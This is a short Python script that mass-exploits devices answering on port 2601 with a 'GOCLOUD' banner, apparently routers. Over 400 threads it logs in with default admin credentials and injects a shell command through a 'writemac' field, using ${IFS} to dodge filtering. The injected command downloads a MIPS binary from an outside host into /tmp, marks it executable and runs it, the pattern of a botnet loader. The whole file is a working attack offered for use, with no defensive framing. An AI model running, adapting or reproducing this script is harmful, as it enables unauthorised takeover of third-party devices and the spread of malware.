import socket, time, sys
from multiprocessing.pool import ThreadPool

cmd = "cd${IFS}/tmp/;${IFS}rm${IFS}mpsl;${IFS}wget${IFS}http://data.melancholy.cc/release-killer/mpsl;${IFS}chmod${IFS}777${IFS}mpsl;${IFS}./mpsl${IFS}china_mipsel"
sequence = ['admin\n','admin\n', '\n', f'writemac ;{cmd};\n']

def exploit(ip):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ip, 2601))
    data = s.recv(8096)
    if 'GOCLOUD' in str(data):
      time.sleep(1)
      for seq in sequence:
        s.send(bytes(seq, 'utf-8'))
        time.sleep(1)
  except Exception as e:
    print(f"Borked in exploit(): {e}")

if len(sys.argv) != 2:
  print(f"Usage: python3 {sys.argv[0]} iplist.txt")
  exit()

ips = [line.rstrip('\n') for line in open(sys.argv[1])]
pool = ThreadPool(400)
pool.map(exploit,ips)
